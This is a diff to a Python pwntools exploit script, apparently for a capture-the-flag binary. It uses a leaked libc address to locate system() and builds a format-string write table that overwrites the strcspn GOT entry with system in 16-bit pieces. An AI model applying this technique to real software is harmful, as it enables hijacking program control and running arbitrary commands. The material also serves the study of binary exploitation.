@@ -79,17 +79,20 @@ leaked_libc = io.recvuntil(b"leaked_libc")[-23:-11]
 leaked_libc = int(leaked_libc, 16)
 libc.address = leaked_libc - (libc.sym['write']+23)
 success(f"libc.address: {hex(libc.address)}")
+info(f"system.address: {hex(libc.sym['system'])}")
 
 system = libc.sym['system']
 
 # overwrite system to got strcspn
 
+## key = target, value = data. [target] = data
 format_string_dict = {}
 format_string_dict[exe.got['strcspn']] = system & 0xffff
 system = system >> 16
 format_string_dict[exe.got['strcspn'] + 2] = system & 0xffff
 system = system >> 16
 format_string_dict[exe.got['strcspn'] + 4] = system & 0xffff
+## sort dict by value
 sortedDict = {k: v for k, v in sorted(format_string_dict.items(), key=lambda item: item[1])}
 
 first = list(sortedDict.values())[0]
